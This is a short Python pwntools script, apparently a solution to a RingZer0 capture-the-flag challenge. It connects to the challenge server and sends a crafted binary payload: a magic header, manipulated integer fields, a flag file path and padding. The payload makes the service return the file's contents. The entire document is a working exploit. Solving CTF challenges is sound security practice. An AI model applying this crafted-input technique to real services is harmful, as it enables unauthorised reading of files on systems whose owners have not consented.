from pwn import *
def main():
	"""#Test
	HOST = "192.168.56.102"
	PORT = 8989
	"""
	HOST = "ringzer0team.com"
	PORT = 60001
	r = remote(HOST,PORT)
	#Check
	r.send("UcpA\xf6\xff\xff\xff\x40\x00\x00\x00\x40\x00\x00\x00/challenges/68/flag.txt"+"\x00"*233+"\x01")
	print r.recv(128)
	pass
main()
